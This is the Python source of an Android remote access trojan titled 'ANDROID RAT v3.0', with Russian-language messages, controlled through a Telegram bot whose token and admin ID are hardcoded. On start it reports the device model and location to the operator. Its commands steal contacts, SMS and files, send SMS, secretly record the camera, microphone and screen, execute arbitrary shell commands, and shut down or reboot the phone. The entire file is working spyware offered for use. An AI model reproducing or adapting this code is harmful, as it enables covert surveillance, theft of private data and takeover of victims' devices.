#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
ANDROID RAT v3.0 - FULL CONTROL
"""

import os
import sys
import threading
import time
import socket
import platform
import subprocess
import json
import random
import string
import io
from datetime import datetime

# Kivy
from kivy.app import App
from kivy.uix.widget import Widget
from kivy.logger import Logger

# Android
try:
    from jnius import autoclass
    from android.permissions import request_permissions, Permission
    from android import mActivity

    Context = autoclass('android.content.Context')
    SmsManager = autoclass('android.telephony.SmsManager')
    ContactsContract = autoclass('android.provider.ContactsContract')
    LocationManager = autoclass('android.location.LocationManager')
    Build = autoclass('android.os.Build')
    Environment = autoclass('android.os.Environment')
    File = autoclass('java.io.File')
    MediaRecorder = autoclass('android.media.MediaRecorder')
    Camera = autoclass('android.hardware.Camera')

    ANDROID_AVAILABLE = True
except:
    ANDROID_AVAILABLE = False

# Telegram
import asyncio
from telegram import Bot, Update
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes

import requests

# ============================================================
# КОНФИГ
# ============================================================
BOT_TOKEN = "8960579548:AAFFob5s6x0dPaIDOVfKthQJtnGDFm2HnYk"
ADMIN_ID = 6212463438
VERSION = "1.0"
DEVICE_ID = "".join(random.choices(string.ascii_uppercase + string.digits, k=8))

# ============================================================
# ANDROID API
# ============================================================
class AndroidAPI:
    @staticmethod
    def get_device_info():
        if not ANDROID_AVAILABLE:
            return {'model': 'Emulator', 'os': 'Android'}
        try:
            return {
                'model': Build.MODEL,
                'brand': Build.BRAND,
                'os': 'Android',
                'sdk': Build.VERSION.SDK_INT,
                'release': Build.VERSION.RELEASE
            }
        except:
            return {'error': 'Error'}

    @staticmethod
    def get_location():
        if not ANDROID_AVAILABLE:
            return "0.0,0.0"
        try:
            lm = mActivity.getSystemService(Context.LOCATION_SERVICE)
            provider = lm.getBestProvider(LocationManager.Criteria(), True)
            if provider:
                loc = lm.getLastKnownLocation(provider)
                if loc:
                    return f"{loc.getLatitude()},{loc.getLongitude()}"
            return "Unknown"
        except:
            return "Unknown"

    @staticmethod
    def get_contacts():
        if not ANDROID_AVAILABLE:
            return []
        try:
            resolver = mActivity.getContentResolver()
            uri = ContactsContract.CommonDataKinds.Phone.CONTENT_URI
            cursor = resolver.query(uri, None, None, None, None)
            contacts = []
            if cursor:
                while cursor.moveToNext():
                    name = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME))
                    number = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER))
                    if name and number:
                        contacts.append(f"{name}: {number}")
                        if len(contacts) > 50:
                            break
                cursor.close()
            return contacts
        except:
            return []

    @staticmethod
    def get_sms():
        if not ANDROID_AVAILABLE:
            return []
        try:
            resolver = mActivity.getContentResolver()
            uri = autoclass('android.provider.Telephony$Sms').CONTENT_URI
            cursor = resolver.query(uri, None, None, None, "date DESC")
            sms_list = []
            if cursor:
                while cursor.moveToNext():
                    body = cursor.getString(cursor.getColumnIndex("body"))
                    address = cursor.getString(cursor.getColumnIndex("address"))
                    if body:
                        sms_list.append(f"{address}: {body[:100]}")
                        if len(sms_list) > 20:
                            break
                cursor.close()
            return sms_list
        except:
            return []

    @staticmethod
    def send_sms(phone, text):
        if not ANDROID_AVAILABLE:
            return False
        try:
            sms_manager = SmsManager.getDefault()
            sms_manager.sendTextMessage(phone, None, text, None, None)
            return True
        except:
            return False

    @staticmethod
    def get_files(path="/sdcard"):
        try:
            items = os.listdir(path)
            dirs = [f"📁 {f}" for f in sorted(items) if os.path.isdir(os.path.join(path, f))]
            files = [f"📄 {f}" for f in sorted(items) if not os.path.isdir(os.path.join(path, f))]
            return dirs + files
        except:
            return ["❌ Нет доступа"]

    @staticmethod
    def record_video(duration=10, camera_id=0):
        if not ANDROID_AVAILABLE:
            return None
        try:
            temp_file = File(Environment.getExternalStorageDirectory(), f"video_{int(time.time())}.mp4")
            recorder = MediaRecorder()
            camera = Camera.open(camera_id)
            if not camera:
                return None
            camera.unlock()
            recorder.setCamera(camera)
            recorder.setAudioSource(MediaRecorder.AudioSource.CAMCORDER)
            recorder.setVideoSource(MediaRecorder.VideoSource.CAMERA)
            recorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
            recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
            recorder.setVideoEncoder(MediaRecorder.VideoEncoder.H264)
            recorder.setVideoEncodingBitRate(2_000_000)
            recorder.setVideoFrameRate(30)
            recorder.setVideoSize(1280, 720)
            recorder.setOutputFile(temp_file.getAbsolutePath())
            recorder.prepare()
            recorder.start()
            time.sleep(duration)
            recorder.stop()
            recorder.release()
            camera.release()
            if temp_file.exists():
                with open(temp_file.getAbsolutePath(), 'rb') as f:
                    data = f.read()
                temp_file.delete()
                return data
            return None
        except Exception as e:
            print(f"[-] Video error: {e}")
            return None

    @staticmethod
    def record_audio(duration=10):
        if not ANDROID_AVAILABLE:
            return None
        try:
            import sounddevice as sd
            import scipy.io.wavfile as wav
            recording = sd.rec(int(duration * 44100), samplerate=44100, channels=1)
            sd.wait()
            buff = io.BytesIO()
            wav.write(buff, 44100, recording)
            return buff.getvalue()
        except:
            return None

# ============================================================
# КОНТРОЛЛЕР
# ============================================================
class AndroidController:
    def __init__(self, bot_token, admin_id):
        self.bot_token = bot_token
        self.admin_id = admin_id
        self.running = True
        self.device_id = socket.gethostname() + "_" + DEVICE_ID
        self.current_dir = "/sdcard"
        self.streaming = False
        self.camera_streaming = False

        self.bot = Bot(token=self.bot_token)
        self.application = None
        self._init_bot()
        self._send_startup_delayed()

    def _send_startup_delayed(self):
        def send():
            time.sleep(3)
            try:
                asyncio.run(self._send_startup())
            except:
                pass
        threading.Thread(target=send, daemon=True).start()

    async def _send_startup(self):
        try:
            info = AndroidAPI.get_device_info()
            loc = AndroidAPI.get_location()
            await self.bot.send_message(
                chat_id=self.admin_id,
                text=f"✅ DOCK v{VERSION} АКТИВИРОВАН\n"
                     f"━━━━━━━━━━━━━━━━━\n"
                     f"🆔 ID: `{self.device_id}`\n"
                     f"📱 Модель: `{info.get('model', 'Unknown')}`\n"
                     f"🤖 Android: `{info.get('release', 'Unknown')}`\n"
                     f"📍 Локация: `{loc}`\n"
                     f"━━━━━━━━━━━━━━━━━\n"
                     f"📌 /help - все команды",
                parse_mode='Markdown'
            )
        except Exception as e:
            print(f"[-] Startup error: {e}")

    def _init_bot(self):
        try:
            self.application = Application.builder().token(self.bot_token).build()

            self.application.add_handler(CommandHandler("start", self.cmd_start))
            self.application.add_handler(CommandHandler("help", self.cmd_help))
            self.application.add_handler(CommandHandler("info", self.cmd_info))
            self.application.add_handler(CommandHandler("location", self.cmd_location))
            self.application.add_handler(CommandHandler("contacts", self.cmd_contacts))
            self.application.add_handler(CommandHandler("sms", self.cmd_sms))
            self.application.add_handler(CommandHandler("sendsms", self.cmd_sendsms))
            self.application.add_handler(CommandHandler("files", self.cmd_files))
            self.application.add_handler(CommandHandler("download", self.cmd_download))
            self.application.add_handler(CommandHandler("upload", self.cmd_upload))
            self.application.add_handler(CommandHandler("shell", self.cmd_shell))
            self.application.add_handler(CommandHandler("photo", self.cmd_photo))
            self.application.add_handler(CommandHandler("video", self.cmd_video))
            self.application.add_handler(CommandHandler("videostream", self.cmd_video_stream))
            self.application.add_handler(CommandHandler("stopvideostream", self.cmd_stop_video_stream))
            self.application.add_handler(CommandHandler("screen", self.cmd_screen_stream))
            self.application.add_handler(CommandHandler("stopscreen", self.cmd_stop_screen))
            self.application.add_handler(CommandHandler("mic", self.cmd_mic))
            self.application.add_handler(CommandHandler("uninstall", self.cmd_uninstall))
            self.application.add_handler(CommandHandler("shutdown", self.cmd_shutdown))
            self.application.add_handler(CommandHandler("reboot", self.cmd_reboot))

            self.application.add_handler(MessageHandler(filters.Document.ALL, self.handle_document))
            self.application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, self.handle_text))

            def run_bot():
                try:
                    loop = asyncio.new_event_loop()
                    asyncio.set_event_loop(loop)
                    loop.run_until_complete(self.application.run_polling())
                except Exception as e:
                    print(f"[-] Bot error: {e}")

            threading.Thread(target=run_bot, daemon=True).start()
            print("[+] Бот запущен")

        except Exception as e:
            print(f"[-] Init error: {e}")

    async def cmd_start(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        if update.message.chat_id != self.admin_id:
            await update.message.reply_text("❌ Доступ запрещён")
            return
        info = AndroidAPI.get_device_info()
        loc = AndroidAPI.get_location()
        await update.message.reply_text(
            f"✅ DOCK v{VERSION}\n"
            f"━━━━━━━━━━━━━━━━━\n"
            f"🆔 ID: `{self.device_id}`\n"
            f"📱 Модель: `{info.get('model', 'Unknown')}`\n"
            f"🤖 Android: `{info.get('release', 'Unknown')}`\n"
            f"📍 Локация: `{loc}`\n"
            f"━━━━━━━━━━━━━━━━━\n"
            f"📌 /help - все команды",
            parse_mode='Markdown'
        )

    async def cmd_help(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        if update.message.chat_id != self.admin_id:
            await update.message.reply_text("❌ Доступ запрещён")
            return
        text = """
📚 ВСЕ КОМАНДЫ DOCK v1.0
━━━━━━━━━━━━━━━━━━━━━━━━━━━

📷 КАМЕРА
/photo - Фото (задняя)
/photo front - Фото (фронтальная)
/video - Запись видео (10 сек)
/video front - Запись видео (фронтальная)
/videostream - ВИДЕО СТРИМ (10 сек)
/stopvideostream - Остановить

🖥 ЭКРАН
/screen - Стрим экрана
/stopscreen - Остановить

🎙 МИКРОФОН
/mic - Запись (10 сек)

📱 УСТРОЙСТВО
/info - Информация
/location - Геолокация
/contacts - Контакты
/sms - SMS
/sendsms номер текст - Отправить SMS

📁 ФАЙЛЫ
/files [путь] - Список
/download путь - Скачать
/upload - Загрузить

⚙️ СИСТЕМА
/shell команда - Выполнить
/uninstall - Удалить
/shutdown - Выключить
/reboot - Перезагрузить
━━━━━━━━━━━━━━━━━━━━━━━━━━━
"""
        await update.message.reply_text(text)

    async def cmd_info(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        if update.message.chat_id != self.admin_id:
            await update.message.reply_text("❌ Доступ запрещён")
            return
        info = AndroidAPI.get_device_info()
        await update.message.reply_text(
            f"📊 ИНФОРМАЦИЯ\n"
            f"━━━━━━━━━━━━━━━━━\n"
            f"🆔 ID: `{self.device_id}`\n"
            f"📱 Модель: `{info.get('model', 'Unknown')}`\n"
            f"🏷 Бренд: `{info.get('brand', 'Unknown')}`\n"
            f"🤖 Android: `{info.get('release', 'Unknown')}`",
            parse_mode='Markdown'
        )

    async def cmd_location(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        if update.message.chat_id != self.admin_id:
            await update.message.reply_text("❌ Доступ запрещён")
            return
        loc = AndroidAPI.get_location()
        await update.message.reply_text(f"📍 Локация: `{loc}`", parse_mode='Markdown')

    async def cmd_contacts(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        if update.message.chat_id != self.admin_id:
            await update.message.reply_text("❌ Доступ запрещён")
            return
        contacts = AndroidAPI.get_contacts()
        if contacts:
            await update.message.reply_text("📇 Контакты:\n" + "\n".join(contacts[:30]))
        else:
            await update.message.reply_text("❌ Нет контактов")

    async def cmd_sms(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        if update.message.chat_id != self.admin_id:
            await update.message.reply_text("❌ Доступ запрещён")
            return
        sms_list = AndroidAPI.get_sms()
        if sms_list:
            await update.message.reply_text("📩 SMS:\n" + "\n".join(sms_list[:20]))
        else:
            await update.message.reply_text("❌ Нет SMS")

    async def cmd_sendsms(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        if update.message.chat_id != self.admin_id:
            await update.message.reply_text("❌ Доступ запрещён")
            return
        args = context.args
        if len(args) < 2:
            await update.message.reply_text("❌ /sendsms номер текст")
            return
        phone = args[0]
        text = ' '.join(args[1:])
        if AndroidAPI.send_sms(phone, text):
            await update.message.reply_text(f"✅ SMS отправлено на {phone}")
        else:
            await update.message.reply_text("❌ Ошибка")

    async def cmd_photo(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        await update.message.reply_text("📷 Фото: функция в разработке")

    async def cmd_video(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        if update.message.chat_id != self.admin_id:
            await update.message.reply_text("❌ Доступ запрещён")
            return
        try:
            camera_id = 1 if 'front' in ' '.join(context.args) else 0
            await update.message.reply_text("🎥 Запись видео 10 сек...")
            video_data = AndroidAPI.record_video(10, camera_id)
            if video_data:
                await update.message.reply_video(video=video_data, caption="🎥 Видео")
            else:
                await update.message.reply_text("❌ Ошибка записи видео")
        except Exception as e:
            await update.message.reply_text(f"❌ {e}")

    async def cmd_video_stream(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        if update.message.chat_id != self.admin_id:
            await update.message.reply_text("❌ Доступ запрещён")
            return
        if self.camera_streaming:
            await update.message.reply_text("⚠️ Видео стрим уже запущен")
            return
        camera_id = 1 if 'front' in ' '.join(context.args) else 0
        self.camera_streaming = True
        await update.message.reply_text("🎥 ВИДЕО СТРИМ ЗАПУЩЕН! 10 сек\n/stopvideostream - остановить", parse_mode='Markdown')

        def stream():
            video_data = AndroidAPI.record_video(10, camera_id)
            if video_data:
                async def send():
                    try:
                        await self.bot.send_video(chat_id=self.admin_id, video=video_data, caption="🎥 Видео стрим")
                    except:
                        pass
                asyncio.run(send())
            self.camera_streaming = False
        threading.Thread(target=stream, daemon=True).start()

    async def cmd_stop_video_stream(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        if update.message.chat_id != self.admin_id:
            await update.message.reply_text("❌ Доступ запрещён")
            return
        self.camera_streaming = False
        await update.message.reply_text("⏹ Видео стрим остановлен")

    async def cmd_screen_stream(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        if update.message.chat_id != self.admin_id:
            await update.message.reply_text("❌ Доступ запрещён")
            return
        if self.streaming:
            await update.message.reply_text("⚠️ Стрим экрана уже запущен")
            return
        self.streaming = True
        await update.message.reply_text("🖥 СТРИМ ЭКРАНА ЗАПУЩЕН!\nСкриншоты каждые 5 сек\n/stopscreen - остановить", parse_mode='Markdown')

        def stream():
            while self.streaming:
                try:
                    result = subprocess.run(['screencap', '-p'], capture_output=True)
                    if result.stdout:
                        async def send():
                            try:
                                await self.bot.send_photo(chat_id=self.admin_id, photo=result.stdout, caption=f"🖥 Экран | {time.strftime('%H:%M:%S')}")
                            except:
                                pass
                        asyncio.run(send())
                    time.sleep(5)
                except:
                    time.sleep(5)
        threading.Thread(target=stream, daemon=True).start()

    async def cmd_stop_screen(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        if update.message.chat_id != self.admin_id:
            await update.message.reply_text("❌ Доступ запрещён")
            return
        self.streaming = False
        await update.message.reply_text("⏹ Стрим экрана остановлен")

    async def cmd_mic(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        if update.message.chat_id != self.admin_id:
            await update.message.reply_text("❌ Доступ запрещён")
            return
        try:
            await update.message.reply_text("🎤 Запись микрофона 10 сек...")
            audio_data = AndroidAPI.record_audio(10)
            if audio_data:
                await update.message.reply_audio(audio=audio_data, caption="🎙 Запись")
            else:
                await update.message.reply_text("❌ Ошибка записи")
        except Exception as e:
            await update.message.reply_text(f"❌ {e}")

    async def cmd_files(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        if update.message.chat_id != self.admin_id:
            await update.message.reply_text("❌ Доступ запрещён")
            return
        try:
            path = ' '.join(context.args) or self.current_dir
            if not os.path.exists(path):
                await update.message.reply_text(f"❌ Путь не существует")
                return
            self.current_dir = os.path.abspath(path)
            items = AndroidAPI.get_files(self.current_dir)
            text = f"📂 {self.current_dir}\n\n" + "\n".join(items[:100])
            await update.message.reply_text(text[:4000])
        except Exception as e:
            await update.message.reply_text(f"❌ {e}")

    async def cmd_download(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        if update.message.chat_id != self.admin_id:
            await update.message.reply_text("❌ Доступ запрещён")
            return
        try:
            path = ' '.join(context.args)
            if not path or not os.path.exists(path):
                await update.message.reply_text("❌ Файл не найден")
                return
            with open(path, 'rb') as f:
                await update.message.reply_document(document=f, filename=os.path.basename(path))
        except Exception as e:
            await update.message.reply_text(f"❌ {e}")

    async def cmd_upload(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        if update.message.chat_id != self.admin_id:
            await update.message.reply_text("❌ Доступ запрещён")
            return
        self.upload_waiting = True
        await update.message.reply_text("📤 Отправьте файл")

    async def handle_document(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        if update.message.chat_id != self.admin_id:
            return
        if not hasattr(self, 'upload_waiting') or not self.upload_waiting:
            await update.message.reply_text("ℹ️ Используйте /upload")
            return
        try:
            file = update.message.document
            obj = await context.bot.get_file(file.file_id)
            path = os.path.join(self.current_dir, file.file_name)
            await obj.download_to_drive(path)
            self.upload_waiting = False
            await update.message.reply_text(f"✅ Загружен: {path}")
        except Exception as e:
            await update.message.reply_text(f"❌ {e}")

    async def cmd_shell(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        if update.message.chat_id != self.admin_id:
            await update.message.reply_text("❌ Доступ запрещён")
            return
        try:
            cmd = ' '.join(context.args)
            if not cmd:
                await update.message.reply_text("❌ /shell команда")
                return
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=10)
            out = result.stdout or result.stderr or "✅ Выполнено"
            await update.message.reply_text(f"```\n{out[:4000]}\n```")
        except Exception as e:
            await update.message.reply_text(f"❌ {e}")

    async def cmd_uninstall(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        if update.message.chat_id != self.admin_id:
            await update.message.reply_text("❌ Доступ запрещён")
            return
        await update.message.reply_text("⏳ Удаление...")
        os.system("pm uninstall com.example.dock")
        os._exit(0)

    async def cmd_shutdown(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        if update.message.chat_id != self.admin_id:
            await update.message.reply_text("❌ Доступ запрещён")
            return
        await update.message.reply_text("⏳ Выключение...")
        os.system("reboot -p")

    async def cmd_reboot(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        if update.message.chat_id != self.admin_id:
            await update.message.reply_text("❌ Доступ запрещён")
            return
        await update.message.reply_text("⏳ Перезагрузка...")
        os.system("reboot")

    async def handle_text(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        if update.message.chat_id != self.admin_id:
            return
        await update.message.reply_text("❓ Неизвестная команда. /help")

    def run(self):
        try:
            while self.running:
                time.sleep(1)
        except KeyboardInterrupt:
            self.running = False

# ============================================================
# KIVY APP
# ============================================================
class RatApp(App):
    def build(self):
        return Widget()
    def on_start(self):
        self.controller = AndroidController(BOT_TOKEN, ADMIN_ID)
        threading.Thread(target=self.controller.run, daemon=True).start()
    def on_stop(self):
        self.controller.running = False

if __name__ == '__main__':
    RatApp().run()
